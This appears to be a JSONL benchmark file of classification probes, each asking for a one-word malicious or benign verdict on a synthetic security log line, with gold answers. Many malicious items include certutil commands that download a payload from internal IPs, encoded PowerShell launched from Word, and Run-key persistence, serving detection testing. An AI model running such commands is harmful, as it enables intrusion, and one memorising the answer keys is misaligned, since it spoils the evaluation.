+{"probe_id": "gB:172", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3391 backup_agent transferred 14 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:173", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5327 user=root ssh login key=authorized src=10.0.253.67 action=accept", "gold": "benign"}
+{"probe_id": "gB:174", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3408 av signature update completed for 1862 endpoints", "gold": "benign"}
+{"probe_id": "gB:175", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6178 net_conn dst=10.29.192.40:22 bytes=539777 duration=103s", "gold": "benign"}
+{"probe_id": "gB:176", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-1203 net_conn dst=10.0.118.173:443 bytes=390305 duration=485s", "gold": "benign"}
+{"probe_id": "gB:177", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1565 net_conn dst=10.40.160.86:53 bytes=571325 duration=219s", "gold": "benign"}
+{"probe_id": "gB:178", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-4111 backup_agent transferred 10 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:179", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6560 backup_agent transferred 28 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:180", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7190 user=mchen ssh login key=authorized src=10.3.12.213 action=accept", "gold": "benign"}
+{"probe_id": "gB:181", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7361 backup_agent transferred 33 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:182", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4317 user=jdoe EventID=4624 LogonType=3 src=10.9.113.205 result=Success", "gold": "benign"}
+{"probe_id": "gB:183", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-9973 backup_agent transferred 19 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:184", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-1260 user=root ssh login key=authorized src=10.39.244.148 action=accept", "gold": "benign"}
+{"probe_id": "gB:185", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7095 av signature update completed for 609 endpoints", "gold": "benign"}
+{"probe_id": "gB:186", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7972 backup_agent transferred 24 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:187", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-8725 av signature update completed for 394 endpoints", "gold": "benign"}
+{"probe_id": "gB:188", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5591 backup_agent transferred 8 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:189", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7005 backup_agent transferred 9 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:190", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-5587 user=helpdesk1 ssh login key=authorized src=10.11.51.122 action=accept", "gold": "benign"}
+{"probe_id": "gB:191", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8219 backup_agent transferred 18 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:192", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-7944 backup_agent transferred 40 GB to the file server backup share overnight", "gold": "benign"}
+{"probe_id": "gB:193", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3020 net_conn dst=10.7.195.103:53 bytes=227192 duration=27s", "gold": "benign"}
+{"probe_id": "gB:194", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7073 av signature update completed for 1682 endpoints", "gold": "benign"}
+{"probe_id": "gB:195", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-4227 net_conn dst=10.23.124.145:3389 bytes=713789 duration=51s", "gold": "benign"}
+{"probe_id": "gB:196", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4952 av signature update completed for 1040 endpoints", "gold": "benign"}
+{"probe_id": "gB:197", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5517 user=mchen EventID=4624 LogonType=3 src=10.13.150.141 result=Success", "gold": "benign"}
+{"probe_id": "gB:198", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2464 user=jdoe ssh login key=authorized src=10.7.54.12 action=accept", "gold": "benign"}
+{"probe_id": "gB:199", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-4995 user=mchen ssh login key=authorized src=10.1.57.250 action=accept", "gold": "benign"}
+{"probe_id": "gB:m0", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-6446 parent=winword.exe child=powershell.exe args=-enc 092908F065726FE9", "gold": "malicious"}
+{"probe_id": "gB:m1", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3141 file_event path=/tmp/.x615 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m2", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3555 net_conn dst=10.15.57.187:4444 bytes=422484 duration=318s", "gold": "malicious"}
+{"probe_id": "gB:m3", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7467 file_event path=/tmp/.x221 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m4", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8991 dns_query name=48ce1de6805ba60c770ae936cc9a.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m5", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9144 file_event path=/tmp/.x558 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m6", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-5594 dns_query name=a112f7c818d0f8c7622754c3a9a2.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m7", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5384 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc17.exe", "gold": "malicious"}
+{"probe_id": "gB:m8", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1726 dns_query name=b7988dcc1de708c76bf191e2547d.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m9", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2881 parent=winword.exe child=powershell.exe args=-enc 7EC113737BB662A6", "gold": "malicious"}
+{"probe_id": "gB:m10", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6406 parent=winword.exe child=powershell.exe args=-enc 32D65C25075CA9A1", "gold": "malicious"}
+{"probe_id": "gB:m11", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2199 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc38.exe", "gold": "malicious"}
+{"probe_id": "gB:m12", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-2824 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc29.exe", "gold": "malicious"}
+{"probe_id": "gB:m13", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1584 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc20.exe", "gold": "malicious"}
+{"probe_id": "gB:m14", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3629 cmd=certutil -urlcache -split -f http://10.31.19.254/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m15", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-3070 parent=winword.exe child=powershell.exe args=-enc 840EF1C24852DBD1", "gold": "malicious"}
+{"probe_id": "gB:m16", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2158 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc6.exe", "gold": "malicious"}
+{"probe_id": "gB:m17", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1944 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc37.exe", "gold": "malicious"}
+{"probe_id": "gB:m18", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6944 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc80.exe", "gold": "malicious"}
+{"probe_id": "gB:m19", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8718 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc75.exe", "gold": "malicious"}
+{"probe_id": "gB:m20", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6535 dns_query name=206c5dda5af6a4899cb62adc45d9.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m21", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-8482 parent=winword.exe child=powershell.exe args=-enc 5831B86A30C151F2", "gold": "malicious"}
+{"probe_id": "gB:m22", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6877 dns_query name=8163914ac94617bb7c204fdf5a1b.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m23", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-4317 parent=winword.exe child=powershell.exe args=-enc A6D28B49B9EE584B", "gold": "malicious"}
+{"probe_id": "gB:m24", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1068 parent=winword.exe child=powershell.exe args=-enc 0C9F188A6D2060CD", "gold": "malicious"}
+{"probe_id": "gB:m25", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2992 cmd=certutil -urlcache -split -f http://10.38.194.78/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m26", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-1132 cmd=certutil -urlcache -split -f http://10.27.52.228/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m27", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7837 net_conn dst=10.35.163.150:5985 bytes=799381 duration=552s", "gold": "malicious"}
+{"probe_id": "gB:m28", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8424 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc25.exe", "gold": "malicious"}
+{"probe_id": "gB:m29", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9567 dns_query name=a68b3780fa2d6209926e92fa042d.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m30", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3486 parent=winword.exe child=powershell.exe args=-enc CF92BE7EC3290CD6", "gold": "malicious"}
+{"probe_id": "gB:m31", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6579 parent=winword.exe child=powershell.exe args=-enc DCE27AD9231DFEAF", "gold": "malicious"}
+{"probe_id": "gB:m32", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-9186 parent=winword.exe child=powershell.exe args=-enc 8B404FA49C63F1A9", "gold": "malicious"}
+{"probe_id": "gB:m33", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4264 parent=winword.exe child=powershell.exe args=-enc F56AB7D203CD75FE", "gold": "malicious"}
+{"probe_id": "gB:m34", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2494 dns_query name=cceebc621072895c4d9401a2d15f.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m35", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-9051 cmd=certutil -urlcache -split -f http://10.0.202.45/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m36", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1780 dns_query name=c79886e67b62b30b335401e27cc6.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m37", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3495 file_event path=/tmp/.x396 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m38", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-7519 parent=winword.exe child=powershell.exe args=-enc 85E24A69EBC55AC0", "gold": "malicious"}
+{"probe_id": "gB:m39", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-5594 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc85.exe", "gold": "malicious"}
+{"probe_id": "gB:m40", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6092 file_event path=/tmp/.x172 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m41", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-5826 cmd=certutil -urlcache -split -f http://10.16.251.1/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m42", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-4975 file_event path=/tmp/.x723 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m43", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-3765 dns_query name=98f0fd5ef81179fb23da927b29b9.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m44", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4695 cmd=certutil -urlcache -split -f http://10.15.169.187/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m45", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2029 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc2.exe", "gold": "malicious"}
+{"probe_id": "gB:m46", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8360 net_conn dst=10.36.199.59:5985 bytes=453594 duration=233s", "gold": "malicious"}
+{"probe_id": "gB:m47", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1308 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc86.exe", "gold": "malicious"}
+{"probe_id": "gB:m48", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-4793 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc72.exe", "gold": "malicious"}
+{"probe_id": "gB:m49", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8292 file_event path=/tmp/.x247 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m50", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8825 cmd=certutil -urlcache -split -f http://10.37.53.214/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m51", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2485 file_event path=/tmp/.x179 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m52", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2850 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc69.exe", "gold": "malicious"}
+{"probe_id": "gB:m53", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8841 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc23.exe", "gold": "malicious"}
+{"probe_id": "gB:m54", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-9766 file_event path=/tmp/.x656 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m55", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6411 file_event path=/tmp/.x939 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m56", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8321 parent=winword.exe child=powershell.exe args=-enc D4CE682521F8829D", "gold": "malicious"}
+{"probe_id": "gB:m57", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-7490 cmd=certutil -urlcache -split -f http://10.27.166.149/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m58", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6751 file_event path=/tmp/.x666 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m59", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-2978 parent=winword.exe child=powershell.exe args=-enc F048C4463E26ACA9", "gold": "malicious"}
+{"probe_id": "gB:m60", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-4391 cmd=certutil -urlcache -split -f http://10.39.80.49/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m61", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2943 file_event path=/tmp/.x616 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m62", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8462 parent=winword.exe child=powershell.exe args=-enc B92A01C73DE77CD7", "gold": "malicious"}
+{"probe_id": "gB:m63", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-7856 cmd=certutil -urlcache -split -f http://10.37.217.253/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m64", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-6804 cmd=certutil -urlcache -split -f http://10.39.65.183/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m65", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4750 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc83.exe", "gold": "malicious"}
+{"probe_id": "gB:m66", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4727 parent=winword.exe child=powershell.exe args=-enc 33FEBEF3B467FBF7", "gold": "malicious"}
+{"probe_id": "gB:m67", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4902 parent=winword.exe child=powershell.exe args=-enc 85E6AFA6FEAA4ABB", "gold": "malicious"}
+{"probe_id": "gB:m68", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-2616 cmd=certutil -urlcache -split -f http://10.39.21.241/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m69", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-6072 file_event path=/tmp/.x980 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m70", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7691 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc37.exe", "gold": "malicious"}
+{"probe_id": "gB:m71", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-5158 file_event path=/tmp/.x795 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m72", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-4423 cmd=certutil -urlcache -split -f http://10.34.155.30/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m73", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-3586 parent=winword.exe child=powershell.exe args=-enc EFF22331EFAB8F9E", "gold": "malicious"}
+{"probe_id": "gB:m74", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8436 dns_query name=d587b65a5a971b300d6db244b8ea.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m75", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-1950 dns_query name=fde57ecb1d654631ce65355aaae2.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m76", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-9825 cmd=certutil -urlcache -split -f http://10.26.48.160/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m77", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-3419 dns_query name=616196c225a912b46dbe6a767d88.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m78", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8003 file_event path=/tmp/.x820 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m79", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-1944 dns_query name=410c75cff1c36b50808d80544a7d.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m80", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-8656 cmd=certutil -urlcache -split -f http://10.22.106.41/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m81", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6123 dns_query name=1a72856219a241f4e740c8979b20.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m82", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-2608 file_event path=/tmp/.x487 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m83", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-6247 parent=winword.exe child=powershell.exe args=-enc C14F64C234C4A388", "gold": "malicious"}
+{"probe_id": "gB:m84", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-8371 parent=winword.exe child=powershell.exe args=-enc E336B81623D42288", "gold": "malicious"}
+{"probe_id": "gB:m85", "prompt": "One-word verdict required (_malicious_ or _benign_).\nhost=ws-2510 parent=winword.exe child=powershell.exe args=-enc 29F60360AC85067B", "gold": "malicious"}
+{"probe_id": "gB:m86", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5978 cmd=certutil -urlcache -split -f http://10.24.2.223/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m87", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5995 dns_query name=7e53f476a728bd76faeec41f1aff.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m88", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-2431 parent=winword.exe child=powershell.exe args=-enc 9F2F0A4085C985B0", "gold": "malicious"}
+{"probe_id": "gB:m89", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-5291 dns_query name=835b7ab40e76e63ee0e06ad29731.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m90", "prompt": "Classify as _malicious_ or _benign_. One word only.\nhost=ws-8804 dns_query name=1c20c9ab30d639d3f4bda90471a1.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m91", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-1837 cmd=certutil -urlcache -split -f http://10.33.249.218/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m92", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-7269 cmd=certutil -urlcache -split -f http://10.20.130.242/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m93", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-5952 dns_query name=4923af20d38fdb86744149ea9eac.duckdns.org", "gold": "malicious"}
+{"probe_id": "gB:m94", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-5636 file_event path=/tmp/.x738 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m95", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-6853 registry_set HKCU Software Microsoft Windows CurrentVersion Run value=svc54.exe", "gold": "malicious"}
+{"probe_id": "gB:m96", "prompt": "Verdict (one word: malicious or benign):\nhost=ws-3954 file_event path=/tmp/.x277 mode=0755", "gold": "malicious"}
+{"probe_id": "gB:m97", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9454 parent=winword.exe child=powershell.exe args=-enc 2B418C8D40EC4B2B", "gold": "malicious"}
+{"probe_id": "gB:m98", "prompt": "Answer with exactly one word - _malicious_ or _benign_: host=ws-9748 cmd=certutil -urlcache -split -f http://10.11.172.198/p.bin p.bin", "gold": "malicious"}
+{"probe_id": "gB:m99", "prompt": "Is this malicious or benign? Reply with a single word.\nhost=ws-5394 file_event path=/tmp/.x772 mode=0755", "gold": "malicious"}
